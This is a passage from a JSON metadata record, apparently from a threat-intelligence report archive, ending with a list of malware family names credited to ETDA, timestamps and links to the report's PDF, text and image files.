                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536040,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1653760951,
    "ts_modification_date": 1653760951,
    "files": {
        "pdf": "https://archive.orkl.eu/8a605d211b35f21782b1f509cb9b1950a710f033.pdf",
        "text": "https://archive.orkl.eu/8a605d211b35f21782b1f509cb9b1950a710f033.txt",
        "img": "https://archive.orkl.eu/8a605d211b35f21782b1f509cb9b1950a710f033.jpg"
    }
}